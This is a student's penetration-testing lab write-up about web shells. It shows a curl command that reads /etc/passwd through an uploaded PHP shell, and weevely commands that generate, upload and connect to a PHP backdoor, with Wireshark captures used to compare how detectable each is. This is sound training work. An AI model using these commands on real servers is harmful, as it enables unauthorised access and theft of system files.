# Lab 8.1 - Weevely💡

Webshells like simple-backdoor.php are effective but are not terribly stealthy. Basic IDS/IPS systems will be able to detect "shell-like" behavior by seeing content that looks like commands, prompts and sensitive files like /etc/passwd.

Wireshark Capture of traditional webshellTarget pippin with a traditional webshell (one without encryption or obfuscation). Capture a dump of /etc/passwd using Wireshark on your wg0 interface.



## Deliverable 1. Provide a screenshot that shows the relevant tcp stream similar to the one below. Create a capture filter on port 80 when you do so.

![image-20221105231720500](./images/1.png)

`curl 'http://10.0.5.25/upload/navarro.php?cmd=cat+/etc/passwd'`

![img](https://lh3.googleusercontent.com/ZvriBmNKkEeZZbJwIImROwXt_9QpjiwcG6_a3YaeM6j372IH0iOQk0OSr8x_l4OpCt_6j8tq2wfIYdddEs7zLuqhfHKykU3lnaTF3VXzonbi-2LUtqfHFtiyUvOIux3Mp_zQI8txeadEByYLQ0cnP_iG3I1YD7rc_FDiJUQzqwzJ74gIBOUe6VLgd4F8gw)



## Deliverable 2. Investigate weevely (a tool in kali). Create a php agent that is uniquely named, upload the agent to pippin and carry on a session similar to the one shown in the screenshot. Provide a screenshot of your session

To generate an agent I used the following link https://null-byte.wonderhowto.com/forum/hiob-generate-web-backdoors-php-using-weevely-kali-linux-0158905/

according to null-byte.wonderhowto.com. weevely generate [password] [path for agent to be saved]



First I used the following command to generate weevely:

`weevely generate LOL /home/champuser/Desktop/week8/door3.php`

And then uploaded the file inside the ftp server:

![2](./images/2.png)

Next I used the following command to login:

`weevely http://10.0.5.25/upload/door3.php LOL`

![3](./images/3.png)

## Deliverable 3. Provide a screenshot similar to the one below that displays the encoded tcp stream from a weevely dump of /etc/passwd. Make sure to use a capture filter of port 80, to limit traffic.

![image-20221105230845175](./images/4.png)



![image-20221105230946980](./images/5.png)





## reflections:

It was great lab I learned a lot. I did not know it is that easy to generate a backdoor, I thought we have to write the code for the php backdoor.























